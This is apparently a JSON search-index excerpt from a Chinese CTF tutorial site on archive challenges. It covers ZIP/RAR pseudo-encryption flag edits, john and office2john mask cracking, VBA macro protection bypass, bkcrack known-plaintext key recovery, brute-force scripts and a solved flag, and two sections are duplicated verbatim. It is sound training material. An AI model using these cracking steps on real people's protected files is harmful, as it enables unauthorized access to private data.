Lamo","text":"<p>\u963f\u5fb7\u91cc\u5b89\u00b7\u963f\u65b9\u7d22\u00b7\u62c9\u83ab\u00b7\u963f\u7279\u4f0d\u5fb7\u662f\u4e00\u540d\u7f8e\u56fd\u5a01\u80c1\u5206\u6790\u5e08\u548c\u9ed1\u5ba2</p> <p>\u62c9\u83ab\u662f\u4e00\u540d\u7070\u5e3d\u9ed1\u5ba2\uff0c\u4ed6\u5bf9\u4e07\u7ef4\u7f51\u7684\u5174\u8d77\u65e2\u5174\u594b\u53c8\u8b66\u60d5\u3002\u4ed6\u8ba4\u4e3a\uff0c\u5728\u4e92\u8054\u7f51\u53d1\u5c55\u7684\u65e9\u671f\uff0c\u5176\u4ed6\u4eba\u6ca1\u6709\u610f\u8bc6\u5230\u7f51\u7edc\u5b89\u5168\u7684\u91cd\u8981\u6027\u3002\u62c9\u83ab\u4fb5\u5165\u8fc7\u516c\u53f8\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\uff0c\u4f46\u4ece\u672a\u635f\u574f\u8fc7\u5b83\u4eec\u3002\u76f8\u53cd\uff0c\u4ed6\u4f1a\u514d\u8d39\u4fee\u590d\u5b89\u5168\u6f0f\u6d1e\uff0c\u5982\u679c\u6f0f\u6d1e\u5f97\u4e0d\u5230\u4fee\u590d\uff0c\u4ed6\u5c31\u4f1a\u5411\u5a92\u4f53\u901a\u62a5\u3002\u62c9\u83ab\u5e0c\u671b\u88ab\u4e00\u5bb6\u516c\u53f8\u96c7\u4f63\uff0c\u5c1d\u8bd5\u4fb5\u5165\u7cfb\u7edf\u5e76\u6d4b\u8bd5\u5176\u5b89\u5168\u6027\uff0c\u8fd9\u79cd\u505a\u6cd5\u540e\u6765\u88ab\u79f0\u4e3a \u201c\u7ea2\u961f\u201d\u3002\u4f46\u5f53\u8fd9\u79cd\u505a\u6cd5\u53d8\u5f97\u666e\u904d\u65f6\uff0c\u4ed6\u7684\u91cd\u7f6a\u5224\u51b3\u4f7f\u4ed6\u65e0\u6cd5\u88ab\u8058\u7528</p> <p>2002 \u5e74 2 \u6708\uff0c\u4ed6\u4fb5\u5165\u4e86\u300a\u7ebd\u7ea6\u65f6\u62a5\u300b\u7684\u5185\u90e8\u8ba1\u7b97\u673a\u7f51\u7edc\uff0c\u5c06\u81ea\u5df1\u7684\u540d\u5b57\u6dfb\u52a0\u5230\u5185\u90e8\u4e13\u5bb6\u8d44\u6e90\u6570\u636e\u5e93\u4e2d</p> <p>2018 \u5e74 3 \u6708 14 \u65e5\uff0c\u62c9\u83ab\u5728\u582a\u8428\u65af\u5dde\u5a01\u5947\u6258\u53bb\u4e16\uff0c\u4eab\u5e74 37 \u5c81</p> <p></p>"},{"location":"Misc/Chapter3/3-1/","title":"ZIP \u4f2a\u52a0\u5bc6\u7834\u89e3","text":""},{"location":"Misc/Chapter3/3-1/#zip-\u4f2a\u52a0\u5bc6\u7834\u89e3","title":"ZIP \u4f2a\u52a0\u5bc6\u7834\u89e3","text":"<p>Zip \u4f2a\u52a0\u5bc6\u662f\u5728\u6587\u4ef6\u5934\u7684\u52a0\u5bc6\u6807\u5fd7\u4f4d\u505a\u4fee\u6539\uff0c\u8fdb\u800c\u518d\u6253\u5f00\u6587\u4ef6\u65f6\u8bc6\u88ab\u522b\u4e3a\u52a0\u5bc6\u538b\u7f29\u5305 </p> <p>\u4e0b\u8f7d\u6587\u4ef6\u540e\u6253\u5f00\u4f1a\u53d1\u73b0\u9700\u8981\u5bc6\u7801</p> <p></p> <p>Zip \u6587\u4ef6\u7ed3\u6784\u5206\u6790\uff1a</p> <pre><code>1. \u56fa\u5b9a\u5934\u6587\u4ef6\uff1a50 4B 03 04\n2. \u89e3\u538b\u6240\u9700 pkware \u7248\u672c\uff1a14 00\n3. \u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\uff08\u6709\u65e0\u52a0\u5bc6\uff09\uff1a00 00\n</code></pre> <p>\u4f2a\u52a0\u5bc6\u53ea\u9700\u77e5\u9053\u8fd9\u4e9b\u5c31\u53ef\u4ee5\u4e86</p> <p></p> <p>09 00 \u4e00\u822c\u90fd\u662f\u4f2a\u52a0\u5bc6\uff0c\u6539\u4e3a 00 00 \u5373\u53ef\u6253\u5f00\uff0c\u6709\u591a\u4e2a\u5219\u90fd\u6539\u4e3a 00</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter3/3-10/","title":"\u52a0\u5bc6\u5b8f\u7834\u89e3","text":""},{"location":"Misc/Chapter3/3-10/#\u52a0\u5bc6\u5b8f\u7834\u89e3","title":"\u52a0\u5bc6\u5b8f\u7834\u89e3","text":"<p>\u89e3\u538b\u7f29\u6709\u4e09\u4e2a\u6587\u4ef6</p> <p></p> <p>\u9996\u5148\u662f hint.txt</p> <pre><code>The length of docm 's password is 6\nThe Regular Expression of the password is:\n[a-z] [a-z] q [a-z] b [a-z]\n</code></pre> <p>\u5f97\u77e5 <code>password.docm</code> \u5bc6\u7801\u5168\u5c0f\u5199\u5b57\u6bcd\uff0c\u4e14\u6ee1\u8db3 <code>??q?b?</code>\uff0c\u4f7f\u7528 john \u7206\u7834\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528 Archpr\uff09</p> <p>\u5c06 Office \u6587\u6863\u4e2d\u7684\u54c8\u5e0c\u63d0\u53d6\u51fa\u6765\uff0c\u4fdd\u5b58\u4e3a <code>hash.txt</code></p> <pre><code>office2john password.docm &gt; word.hash\n</code></pre> <p>\u4f7f\u7528 \u63a9\u7801\u653b\u51fb\uff08mask attack\uff09 \u5c1d\u8bd5\u7206\u7834 <code>hash.txt</code> \u4e2d\u7684\u5bc6\u7801\u54c8\u5e0c</p> <pre><code>john --mask='?l?lq?lb?l' word.hash\n# ?l \u8868\u793a \u5c0f\u5199\u5b57\u6bcd\uff08a-z\uff09\n# q \u548c b \u662f\u56fa\u5b9a\u5b57\u7b26\n</code></pre> <p></p> <p>\u6253\u5f00 word</p> <p></p> <p>\u5f97\u5148\u7834\u89e3\u5b8f\uff0c\u5c06 word \u6587\u4ef6\u7528\u538b\u7f29\u5305\u65b9\u5f0f\u6253\u5f00\uff0c\u627e\u5230 <code>vbaProject.bin</code> \u6587\u4ef6\u4ee5\u5341\u516d\u8fdb\u5236\u65b9\u5f0f\u67e5\u770b\uff0c\u5c06  <code>DBP</code>  \u6539\u4e3a  <code>DBX</code>  \u5e76\u4fdd\u5b58\uff0c\u53c2\u8003\u535a\u5ba2</p> <p></p> <p>\u6ce8\u610f\u4e0d\u8981\u51cf\u5c11\u6216\u8005\u589e\u52a0\u5176\u4ed6\u5b57\u7b26\uff0c\u4fdd\u5b58\u9000\u51fa</p> <p></p> <p>\u91cd\u65b0\u6253\u5f00\u6587\u4ef6\uff0cAlt + F11\u6253\u5f00</p> <p></p> <p>\u53f3\u952e\u6253\u5f00\u5c5e\u6027\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u5bc6\u7801\u4fdd\u5b58\uff0c\u91cd\u65b0\u6253\u5f00\u6587\u4ef6 Alt + F11 \u8f93\u5165\u5bc6\u7801\u5373\u53ef\u67e5\u770b\u5b8f\u4ee3\u7801</p> <p></p> <pre><code>Private Sub CB_OK_Click()\nDim strpasw As String\nDim strdec As String\nDim strusrinput As String\nDim t As String\nt = ChrW(21152) &amp; ChrW(27833) &amp; ChrW(21543) &amp; ChrW(65292) &amp; ChrW(21516) &amp; ChrW(23398) &amp; ChrW(20204) &amp; ChrW(65281)\n\nstrusrinput = Dialog.TextBox_Pasw\nDim sinput As String\nsinput = strusrinput\n\nIf (strusrinput &lt;&gt; \"\") Then\n  strusout = Encode(strusrinput, t)\n  If (strusout = \"\u2524\u2121\u01d2q\uff58~\") Then\n      strdec = Decode(Dialog.Label_ls.Caption, sinput)\n  Else\n     If (strusout = \"\uff4bGJE\uff47\uff51\") Then\n        strdec = Decode(Dialog.Label_ls1.Caption, sinput)\n     Else\n          If (strusout = \"\u042e\u039fopz+\") Then\n             strdec = Decode(Dialog.Label_ls2.Caption, sinput)\n          Else\n                If (strusout = \"\uff5a\u039ajr\u0428\u03c6\u03b5\u3042\") Then\n                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)\n                Else\n                    If (strusout = \"\u00e0\u01d6t\uff35\uff57\u2527\uff48\u00e8\") Then\n                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)\n                    Else\n                          strdec = StrConv(t, vbFromUnicode)\n                    End If\n                End If\n           End If\n      End If\n   End If\n   Label_CLUE.Caption = strdec\nEnd If\n</code></pre> <p>\u65e0\u9700\u5206\u6790\u52a0\u89e3\u5bc6\u7b97\u6cd5\uff0c\u8f93\u51fa\u7ed3\u679c <code>strusout</code> \u7531 <code>Encode(strusrinput, t)</code> \u52a0\u5bc6\u5f97\u5230\uff0c\u53ea\u9700\u5206\u522b\u7528\u89e3\u5bc6\u51fd\u6570\u53cd\u63a8\u4e94\u4e2a if \u5206\u652f\u6761\u4ef6\u5bf9\u5e94\u7684\u660e\u6587\u5373\u53ef</p> <p>\u4fee\u6539 <code>Label_CLUE.Caption = strdec</code> \u4e3a <code>Label_CLUE.Caption = Decode(xxx,t)</code>\uff0c\u56de\u5230 word \u8fd0\u884c <code>AutoOpen</code> \u5b8f</p> <p>\u968f\u4fbf\u8f93\u5165\u5b57\u7b26\u70b9\u51fb\u786e\u5b9a\u5373\u53ef\u5728 Dialog \u7684 label \u5904\u663e\u793a\u5bf9\u5e94\u660e\u6587\uff0c\u5206\u522b\u662f <code>123456</code>\u3001<code>aaaaaa</code>\u3001<code>000000</code>\u3001<code>\u5899\u89d2\u6570\u679d</code>\u3001<code>iloveyou</code></p> <p>\u5c06 <code>Label_CLUE.Caption = Decode(xxx,t)</code> \u6539\u56de <code>Label_CLUE.Caption = strdec</code>\uff0c\u5206\u522b\u8f93\u5165\u4e94\u6bb5\u660e\u6587\uff0c\u53d1\u73b0\u8f93\u5165 <code>\u5899\u89d2\u6570\u679d</code> \u5f97\u5230 <code>\u89e3\u538b\u5bc6\u7801\uff1a\u4e24\u53ea\u9ec4\u9e42\u9e23\u7fe0\u67f3,\u4e00\u884c\u767d\u9e6d\u4e0a\u9752\u5929!</code></p> <p>\u7ed3\u5408 word \u91cc\u7684 hint <code>Rar \u5bc6\u7801\u4e3a\u590d\u6742\u578b\uff0c\u957f\u5ea6\u4e3a16\u4f4d\uff0c\u5305\u542b\u4e86\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u7b26\u53f7\u3002</code></p> <p>\u538b\u7f29\u5305\u5bc6\u7801\u731c\u51fa\u4e3a <code>2zhlmcl,1hblsqt.</code>\uff0c\u89e3\u538b\u62ff\u5230 flag\uff1a<code>Dest0g3{VBScr1pt_And_Hashc4t_1s_g00d}</code></p> <p>\u53c2\u8003\u535a\u5ba2</p>"},{"location":"Misc/Chapter3/3-11/","title":"\u4e0d\u53ef\u89c1\u5b57\u7b26\u5bc6\u7801\u7206\u7834","text":""},{"location":"Misc/Chapter3/3-11/#\u4e0d\u53ef\u89c1\u5b57\u7b26\u5bc6\u7801\u7206\u7834","title":"\u4e0d\u53ef\u89c1\u5b57\u7b26\u5bc6\u7801\u7206\u7834","text":"<p>\u7ed9\u4e86\u4e09\u4e2a\u6587\u4ef6</p> <p></p> <p>\u538b\u7f29\u5305\u91cc\u8fd8\u6709\u4e00\u5c42</p> <p></p> <p>\u5148\u5c1d\u8bd5\u5229\u7528 key \u6587\u4ef6\u505a\u4e00\u4e2a\u660e\u6587\u653b\u51fb</p> <pre><code>bkcrack.exe -C purezip.zip -c \"secret key.zip\" -p key\n</code></pre> <p></p> <p>\u518d\u5229\u7528\u5bc6\u94a5\u76f4\u63a5\u89e3\u538b</p> <pre><code>bkcrack.exe -C purezip.zip -c \"secret key.zip\" -k e63af7cc 55ef839d dc10b922 -d 1.zip\n</code></pre> <p></p> <p>\u6ce8\u610f\u6b64\u65f6\u7684 ZIP \u662f\u538b\u7f29\u4e4b\u540e\u7684\uff0c\u9700\u8981\u89e3\u538b\u4e00\u4e0b\uff0c\u653e\u5230 cyberchef \u91cc\u9762\u4f7f\u7528 raw inflate \u89e3\u4e00\u4e0b\u5e76\u4fdd\u5b58\u538b\u7f29\u5305</p> <p></p> <p>\u544a\u8bc9\u6211\u4eec\u5bc6\u7801\u4e3a\u4e24\u4e2a\u5b57\u8282</p> <p></p> <p>\u5199\u811a\u672c\u7206\u7834</p> <pre><code>import zipfile\nimport libnum\nfrom tqdm import trange\n\nfor i in trange(256):\n    for j in range(256):\n        fz = zipfile.ZipFile('11.zip', 'r')\n        password = libnum.n2s(i) + libnum.n2s(j)\n        try:\n            fz.extractall(pwd=password)\n            print(password)\n            fz.close()\n            break\n        except:\n            fz.close()\n            continue\n    else:\n        continue\n    break\n</code></pre> <p>\u5f97\u5230\u5bc6\u7801\uff1a<code>\\x9c\\x07</code></p> <p>\u518d\u5199\u811a\u672c\u89e3\u538b</p> <pre><code>import zipfile\n\nwith zipfile.ZipFile('download.zip', 'r') as fz:\n    # \u76f4\u63a5\u89e3\u538b\uff0c\u6307\u5b9a\u5bc6\u7801\n    fz.extractall(pwd=b'\\x9c\\x07')\n</code></pre> <p>\u6253\u5f00\u53c8\u5f97\u5230\u5bc6\u94a5</p> <p></p> <p>\u540c\u65f6\u5728 zpaq \u6587\u4ef6\u7684\u6587\u4ef6\u5c3e\u5f97\u5230</p> <p></p> <p>\u5bc6\u7801\u662f md5\uff08\u660e\u6587\u7684\u5bc6\u94a5\uff0c\u957f\u5ea6\u4e3a 3 \u4e2a\u5b57\u8282\uff09</p> <p>\u56e0\u6b64\u8fd8\u9700\u8981\u8fd8\u539f pkzip \u7684\u4e09\u6bb5\u5bc6\u5319\uff0c\u4f7f\u7528\u4e0b\u9762\u6307\u4ee4\u76f4\u63a5\u7834\u89e3</p> <pre><code>bkcrack.exe -k e48d3828 5b7223cc 71851fb0 -r 3 ?b\n# -r 3 \u8868\u793a\u4f7f\u7528\u53cd\u63a8\u9636\u6bb5\uff08reverse\uff09\u8fdb\u884c \u7b2c 3 \u6b21\u8fed\u4ee3\u5c1d\u8bd5\uff0c\u5373\u4ece key2 \u63a8\u56de key0 \u7684\u8fc7\u7a0b\u7684\u6b65\u9aa4\u6b21\u6570\n# ?b \u662f\u4e00\u4e2a\u901a\u914d\u7b26\uff0c\u901a\u5e38\u662f bkcrack \u7684\u53c2\u6570\uff0c\u8868\u793a\u7528 brute-force\uff08\u66b4\u529b\u679a\u4e3e\uff09 \u53bb\u8865\u5168\u67d0\u4e9b\u4fe1\u606f\n</code></pre> <p></p> <p>\u6700\u540e\u4f7f\u7528 md5 \u52a0\u5bc6\u540e\u7684\u5bc6\u7801\u89e3\u538b\u7f29\u5373\u53ef</p>"},{"location":"Misc/Chapter3/3-12/","title":"PKZIP \u5bc6\u94a5\u8fd8\u539f","text":""},{"location":"Misc/Chapter3/3-12/#pkzip-\u5bc6\u94a5\u8fd8\u539f","title":"PKZIP \u5bc6\u94a5\u8fd8\u539f","text":"<p>\u7ed9\u4e86\u4e09\u4e2a\u6587\u4ef6</p> <p></p> <p>\u538b\u7f29\u5305\u91cc\u8fd8\u6709\u4e00\u5c42</p> <p></p> <p>\u5148\u5c1d\u8bd5\u5229\u7528 key \u6587\u4ef6\u505a\u4e00\u4e2a\u660e\u6587\u653b\u51fb</p> <pre><code>bkcrack.exe -C purezip.zip -c \"secret key.zip\" -p key\n</code></pre> <p></p> <p>\u518d\u5229\u7528\u5bc6\u94a5\u76f4\u63a5\u89e3\u538b</p> <pre><code>bkcrack.exe -C purezip.zip -c \"secret key.zip\" -k e63af7cc 55ef839d dc10b922 -d 1.zip\n</code></pre> <p></p> <p>\u6ce8\u610f\u6b64\u65f6\u7684 ZIP \u662f\u538b\u7f29\u4e4b\u540e\u7684\uff0c\u9700\u8981\u89e3\u538b\u4e00\u4e0b\uff0c\u653e\u5230 cyberchef \u91cc\u9762\u4f7f\u7528 raw inflate \u89e3\u4e00\u4e0b\u5e76\u4fdd\u5b58\u538b\u7f29\u5305</p> <p></p> <p>\u544a\u8bc9\u6211\u4eec\u5bc6\u7801\u4e3a\u4e24\u4e2a\u5b57\u8282</p> <p></p> <p>\u5199\u811a\u672c\u7206\u7834</p> <pre><code>import zipfile\nimport libnum\nfrom tqdm import trange\n\nfor i in trange(256):\n    for j in range(256):\n        fz = zipfile.ZipFile('11.zip', 'r')\n        password = libnum.n2s(i) + libnum.n2s(j)\n        try:\n            fz.extractall(pwd=password)\n            print(password)\n            fz.close()\n            break\n        except:\n            fz.close()\n            continue\n    else:\n        continue\n    break\n</code></pre> <p>\u5f97\u5230\u5bc6\u7801\uff1a<code>\\x9c\\x07</code></p> <p>\u518d\u5199\u811a\u672c\u89e3\u538b</p> <pre><code>import zipfile\n\nwith zipfile.ZipFile('download.zip', 'r') as fz:\n    # \u76f4\u63a5\u89e3\u538b\uff0c\u6307\u5b9a\u5bc6\u7801\n    fz.extractall(pwd=b'\\x9c\\x07')\n</code></pre> <p>\u6253\u5f00\u53c8\u5f97\u5230\u5bc6\u94a5</p> <p></p> <p>\u540c\u65f6\u5728 zpaq \u6587\u4ef6\u7684\u6587\u4ef6\u5c3e\u5f97\u5230</p> <p></p> <p>\u5bc6\u7801\u662f md5\uff08\u660e\u6587\u7684\u5bc6\u94a5\uff0c\u957f\u5ea6\u4e3a 3 \u4e2a\u5b57\u8282\uff09</p> <p>\u56e0\u6b64\u8fd8\u9700\u8981\u8fd8\u539f pkzip \u7684\u4e09\u6bb5\u5bc6\u5319\uff0c\u4f7f\u7528\u4e0b\u9762\u6307\u4ee4\u76f4\u63a5\u7834\u89e3</p> <pre><code>bkcrack.exe -k e48d3828 5b7223cc 71851fb0 -r 3 ?b\n# -r 3 \u8868\u793a\u4f7f\u7528\u53cd\u63a8\u9636\u6bb5\uff08reverse\uff09\u8fdb\u884c \u7b2c 3 \u6b21\u8fed\u4ee3\u5c1d\u8bd5\uff0c\u5373\u4ece key2 \u63a8\u56de key0 \u7684\u8fc7\u7a0b\u7684\u6b65\u9aa4\u6b21\u6570\n# ?b \u662f\u4e00\u4e2a\u901a\u914d\u7b26\uff0c\u901a\u5e38\u662f bkcrack \u7684\u53c2\u6570\uff0c\u8868\u793a\u7528 brute-force\uff08\u66b4\u529b\u679a\u4e3e\uff09 \u53bb\u8865\u5168\u67d0\u4e9b\u4fe1\u606f\n</code></pre> <p></p> <p>\u6700\u540e\u4f7f\u7528 md5 \u52a0\u5bc6\u540e\u7684\u5bc6\u7801\u89e3\u538b\u7f29\u5373\u53ef</p>"},{"location":"Misc/Chapter3/3-2/","title":"ZIP \u660e\u6587\u7834\u89e3\uff08\u76f8\u540c\u6587\u4ef6\uff09","text":""},{"location":"Misc/Chapter3/3-2/#zip-\u660e\u6587\u7834\u89e3\u76f8\u540c\u6587\u4ef6","title":"ZIP \u660e\u6587\u7834\u89e3\uff08\u76f8\u540c\u6587\u4ef6\uff09","text":"<p>\u660e\u6587\u653b\u51fb\u4e3b\u8981\u5229\u7528\u5927\u4e8e 12 \u5b57\u8282\u7684\u4e00\u6bb5\u5df2\u77e5\u660e\u6587\u6570\u636e\u8fdb\u884c\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6\u6574\u4e2a\u52a0\u5bc6\u6587\u6863\u7684\u6570\u636e\uff0c\u5177\u4f53\u7684\u539f\u7406\u8fd9\u91cc\u4e0d\u9610\u8ff0 </p> <p>\u4e0b\u8f7d\u6587\u4ef6\u540e\u5f97\u5230\u4e00\u5f20\u56fe\u7247\u4e0e\u4e00\u4e2a\u52a0\u5bc6\u538b\u7f29\u5305</p> <p></p> <p>\u56fe\u7247\u4e0e\u538b\u7f29\u5305\u4e2d\u7684\u56fe\u7247\u662f\u4e00\u6837\u7684\uff08\u8fd9\u91cc\u5c31\u4e0d\u6253\u5f00\u770b\u4e86\uff09\uff0c\u660e\u663e\u63d0\u793a\u4e86\u8981\u660e\u6587\u653b\u51fb\uff0c\u5177\u4f53\u600e\u4e48\u505a\u5462\uff1f</p> <p>\u9996\u5148\u53bb\u770b\u538b\u7f29\u5305\u7684\u7b97\u6cd5</p> <p></p> <p>\u518d\u5c06\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e5f\u538b\u7f29\u6210\u538b\u7f29\u5305\uff0c\u9700\u8981\u4fdd\u8bc1\u7b97\u6cd5\u4e00\u81f4</p> <p>\u4e0d\u540c\u7684\u538b\u7f29\u8f6f\u4ef6\u7b97\u6cd5\u5404\u4e0d\u540c\uff0c\u8fd9\u91cc\u8981\u4f7f\u7528 WinRAR</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177 ARCHPR \u660e\u6587\u653b\u51fb\uff0c\u5728\u660e\u6587\u9009\u9879\u4e2d\u9009\u62e9\u6211\u4eec\u538b\u7f29\u7684\u6587\u4ef6\uff0c\u8fd9\u6837\u5c31\u62ff\u5230\u4e86\u5bc6\u7801</p> <p></p>"},{"location":"Misc/Chapter3/3-3/","title":"RAR \u6587\u4ef6\u5934\u4fee\u590d","text":""},{"location":"Misc/Chapter3/3-3/#rar-\u6587\u4ef6\u5934\u4fee\u590d","title":"RAR \u6587\u4ef6\u5934\u4fee\u590d","text":"<p>\u5f53\u4f7f\u7528 WinRAR \u6253\u5f00\u65f6\u4f1a\u63d0\u793a\u6587\u4ef6\u5934\u9519\u8bef\uff0c\u6211\u4eec\u9700\u8981\u505a\u7684\u5c31\u662f\u53bb\u4fee\u6539\u9519\u8bef\u7684\u6587\u4ef6\u5934 </p> <p>\u6253\u5f00\u6587\u4ef6\u62a5\u9519</p> <p></p> <p>RAR \u6587\u4ef6\u683c\u5f0f\u89e3\u6790\uff1a</p> <pre><code>1. \u56fa\u5b9a\u6587\u4ef6\u5934\uff1a52 61 72 21 1A 07 00\uff08\u5176\u4e2d 0x6152 \u8868\u793a CRC\uff0c0x72 \u8868\u793a\u5934\u7c7b\u578b\uff0c0x1A21 \u8868\u793a FLAGS\uff0c0x0007 \u8868\u793a SIZE\uff09\n2. \u538b\u7f29\u6587\u4ef6\u5934\uff1aCF 90 73 00 00 0D 00 00 00 00 00 00 00\uff08\u7ed3\u6784\u4e0e\u4e0a\u9762\u4e00\u81f4\uff0c0x73 \u8868\u793a\u5934\u7c7b\u578b\uff0c\u53ea\u662f\u591a\u4e86\u516d\u4e2a\u5b57\u8282\u7684\u4fdd\u7559\u4f4d\uff09\n3. \u6587\u4ef6\u5934\uff1aD5 56 74\u2026\u2026\u2026\u2026\uff08\u8fd9\u91cc\u5185\u5bb9\u592a\u591a\uff08\u56fe\u4e2d\u5168\u662f\u84dd\u8272\u90e8\u5206\u5168\u662f\uff09\uff0c\u6211\u4eec\u53ea\u9700\u77e5\u9053\u524d\u4e09\u4e2a\u5b57\u8282\u540c\u6837\u4e0e\u4e0a\u9762\u4e00\u81f4\uff0c0x74 \u8868\u793a\u5934\u7c7b\u578b\uff09\n</code></pre> <p></p> <p>txt \u7684\u5185\u5bb9\u540e\u9762\u5c31\u662f secret.png \u7684\u6587\u4ef6\u5934\uff08txt \u662f\u53ef\u4ee5\u6253\u5f00\u7684\uff0c\u5185\u5bb9\u5c31\u662f\u56fe\u4e2d\u5b57\u7b26\u4e32\uff09</p> <p>\u6587\u4ef6\u5934\u7684\u5934\u7c7b\u578b\u662f 0x7A\uff0c\u5c06\u5176\u6539\u4e3a 0x74</p> <p></p> <p>\u6210\u529f\u89e3\u538b\u7f29\u51fa\u56fe\u7247</p> <p></p>"},{"location":"Misc/Chapter3/3-4/","title":"\u538b\u7f29\u5bc6\u7801\u7206\u7834","text":""},{"location":"Misc/Chapter3/3-4/#\u538b\u7f29\u5bc6\u7801\u7206\u7834","title":"\u538b\u7f29\u5bc6\u7801\u7206\u7834","text":"<p>\u5927\u578b\u6bd4\u8d5b\u4e2d\u5b98\u65b9\u90fd\u4f1a\u63d0\u4f9b\u5b57\u5178\uff0c\u6240\u4ee5\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684 </p> <p>\u8fd9\u91cc\u9700\u8981\u7f51\u4e0a\u53bb\u4e0b\u8f7d\u4e00\u4e2a rockyou \u5b57\u5178</p> <p></p> <p>\u9898\u76ee\u7ed9\u7684\u662f ZIP \u6587\u4ef6\uff0c\u4f7f\u7528\u5de5\u5177 Ziperello \u7206\u7834</p> <p></p> <p>\u9009\u62e9\u5b57\u5178\u6a21\u5f0f</p> <p></p> <p>\u9009\u62e9\u5b57\u5178</p> <p></p> <p>\u6210\u529f\u7206\u7834\u51fa\u5bc6\u7801</p> <p></p>"},{"location":"Misc/Chapter3/3-5/","title":"ZIP \u660e\u6587\u7834\u89e3\uff08\u6587\u4ef6\u5934\uff09","text":""},{"location":"Misc/Chapter3/3-5/#zip-\u660e\u6587\u7834\u89e3\u6587\u4ef6\u5934","title":"ZIP \u660e\u6587\u7834\u89e3\uff08\u6587\u4ef6\u5934\uff09","text":"<p>\u6253\u5f00\u538b\u7f29\u5305\u9700\u8981\u5bc6\u7801\uff0c\u67e5\u770b\u5176\u6587\u4ef6\u7c7b\u578b</p> <p></p> <p>\u77e5\u9053\u6587\u4ef6\u7c7b\u578b\u540e\u5728 WinHex \u4e2d\u521b\u5efa\u76f8\u540c\u683c\u5f0f\u6587\u4ef6</p> <p></p> <p>\u9996\u5148\u6839\u636e\u6587\u4ef6\u5934\u7206\u7834\u51fa key \u503c</p> <pre><code>bkcrack.exe -C flag.zip -c flag.png -p 6.png -o 0 &gt;1.log\n\n-C\uff1a\u88ab\u7206\u7834\u7684\u6587\u4ef6\u540d\n-c\uff1a\u5bc6\u6587\n-p\uff1a\u660e\u6587\n</code></pre> <p></p> <pre><code>bkcrack.exe -C flag.zip -c flag.png -k key -d flag.png\n</code></pre> <p>\u6700\u540e\u8fd8\u9700\u8981\u4fee\u6539\u4e0b CRC \u5bbd\u9ad8\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter3/3-6/","title":"ZIP \u660e\u6587\u7834\u89e3\uff08Key\uff09","text":""},{"location":"Misc/Chapter3/3-6/#zip-\u660e\u6587\u7834\u89e3key","title":"ZIP \u660e\u6587\u7834\u89e3\uff08Key\uff09","text":"<p>\u7ee7\u4e0a\u4e00\u8282\u901a\u8fc7\u6587\u4ef6\u5934\u660e\u6587\u653b\u51fb\u62ff\u5230 Key \u540e</p> <pre><code>bkcrack.exe -C flag.zip -c flag.png -k key -d flag.png\n</code></pre> <p>\u6700\u540e\u8fd8\u9700\u8981\u4fee\u6539\u4e0b CRC \u5bbd\u9ad8\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter3/3-7/","title":"CRC \u78b0\u649e","text":""},{"location":"Misc/Chapter3/3-7/#crc-\u78b0\u649e","title":"CRC \u78b0\u649e","text":"<p>\u6253\u5f00\u6587\u4ef6\u9700\u8981\u5bc6\u7801\uff0c\u4f46\u662f\u53d1\u73b0\u4e86\u4e09\u4e2a\u5927\u5c0f\u76f8\u540c\u7684\u6587\u4ef6\uff0c\u591a\u4e2a\u76f8\u540c\u5927\u5c0f\u6587\u4ef6\u53ef\u4ee5\u786e\u5b9a\u4e3a CRC \u78b0\u649e</p> <p></p> <p>\u4f7f\u7528\u811a\u672c\u78b0\u649e\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter3/3-8/","title":"RAR \u4f2a\u52a0\u5bc6\u7834\u89e3","text":""},{"location":"Misc/Chapter3/3-8/#rar-\u4f2a\u52a0\u5bc6\u7834\u89e3","title":"RAR \u4f2a\u52a0\u5bc6\u7834\u89e3","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\u89e3\u538b\u62a5\u9519</p> <p></p> <p>\u653e\u5165 010 \u4e2d\u89e3\u6790\uff0c\u9996\u5148\u662f\u6587\u4ef6\u5934\u7b7e\u540d</p> <pre><code>52 61 72 21 1A 07 00\n</code></pre> <p></p> <p>\u7b2c\u4e8c\u4e2a\u90e8\u5206\u662f\u5173\u952e</p> \u504f\u79fb \u5927\u5c0f \u540d\u79f0 \u8bf4\u660e 0x00 1 \u5b57\u8282 HEAD_CRC \u5934\u90e8\u6821\u9a8c\u7801 0x01 1 \u5b57\u8282 HEAD_TYPE \u7c7b\u578b\uff08<code>0x74</code> \u8868\u793a File Header\uff09 0x02 2 \u5b57\u8282 HEAD_FLAGS \u6807\u5fd7\u4f4d\uff08\u8fd9\u91cc\u662f\u4f2a\u52a0\u5bc6\u7684\u5173\u952e\uff09 0x04 2 \u5b57\u8282 HEAD_SIZE \u5934\u90e8\u5927\u5c0f 0x06 4 \u5b57\u8282 PACK_SIZE \u538b\u7f29\u540e\u5927\u5c0f 0x0A 4 \u5b57\u8282 UNP_SIZE \u89e3\u538b\u540e\u5927\u5c0f 0x0E 1 \u5b57\u8282 HOST_OS \u64cd\u4f5c\u7cfb\u7edf\u6807\u8bc6 ... \u53ef\u53d8 \u5176\u4f59\u5185\u5bb9 \u5305\u62ec\u6587\u4ef6\u540d\u957f\u5ea6\u3001\u538b\u7f29\u65b9\u6cd5\u3001\u65f6\u95f4\u6233\u7b49 <p>\u5728 RAR 4.x \u4e2d\u4e5f\u5c31\u662f\u7b2c 11 \u4e2a\u5b57\u8282\u5904\u5b9e\u73b0\u4f2a\u52a0\u5bc6</p> <p>\u4e5f\u5c31\u662f 010 Editor \u663e\u793a\u7684\u6587\u4ef6\u7ed3\u6784\u4e2d\u7684 <code>ubyte BLOCK_HEADERS_ENCRYPTED</code> \u5b57\u6bb5\u7684\u503c\u6539\u4e3a 1</p> <p></p> <p>\u5728 5.x \u4e2d\u8fd8\u53ef\u4ee5\u662f\u7b2c 24 \u4e2a\u5b57\u8282\u5904</p> <p></p> 